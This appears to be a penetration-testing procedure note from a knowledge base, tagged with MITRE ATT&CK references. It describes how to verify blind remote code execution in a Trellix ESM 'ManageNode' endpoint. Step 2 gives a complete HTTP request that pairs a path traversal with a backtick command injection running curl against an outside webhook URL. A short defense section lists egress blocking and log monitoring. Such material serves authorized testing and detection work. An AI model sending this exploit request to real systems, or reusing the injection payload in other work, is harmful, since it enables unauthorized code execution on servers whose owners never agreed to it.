---
id: proc-trellix-oob-verify-4
tags:
  - oob
  - command-injection
  - rce
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
  - '[[tools/Webhook-site]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-webhook-oob]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:26:27.004Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Verify-RCE-with-Out-of-Band-HTTP-Callback

## Summary

This procedure uses an out-of-band HTTP request to confirm command execution when direct output from the target is not visible, injecting a curl command via the same ManageNode vulnerability.

## Description

In scenarios where reverse shells are blocked, inject a curl to a controlled webhook to observe interaction, proving RCE without relying on inbound connections.

## Requirements

1. Path traversal access confirmed
2. Unique webhook URL from [[tools/Webhook-site]] or [[tools/Burp-Collaborator]]
3. [[tools/Burp-Suite]] for injection

## Defense

Defensive measures and detection strategies:

- Block outbound HTTP from internal services to unknown domains
- Monitor proxy logs for unexpected curl or wget executions
- Use network segmentation to prevent OOB interactions

## Objectives

1. Prove command execution externally
2. Validate injection without direct feedback
3. Alternative to reverse shell for PoC

## Instructions

### Step 1: Generate Webhook URL

**Context**: Create a unique endpoint for monitoring.

**Command** (Via Webhook.site):

Visit https://webhook.site to get a URL like http://webhook.site/acde4291-64b0-4c2d-b4e3-0c3aeb881c6e.

> Keep the page open to log requests.

### Step 2: Inject OOB Command

**Context**: Embed curl in 'name' parameter.

**Command** ([[commands/curl-webhook-oob]]):

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.1
Host: target-esm.com
Content-Type: application/json

{"serverName":"test132","processes":[{"name":"`curl http://webhook.site/acde4291-64b0-4c2d-b4e3-0c3aeb881c6e`","signal":"Restart"}]}
```

> Expected output: GET request logged in webhook.site.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/curl-webhook-oob]]

## Tools Used

- [[tools/Burp-Collaborator]]
- [[tools/Webhook-site]]

## Tags

- oob
- verification
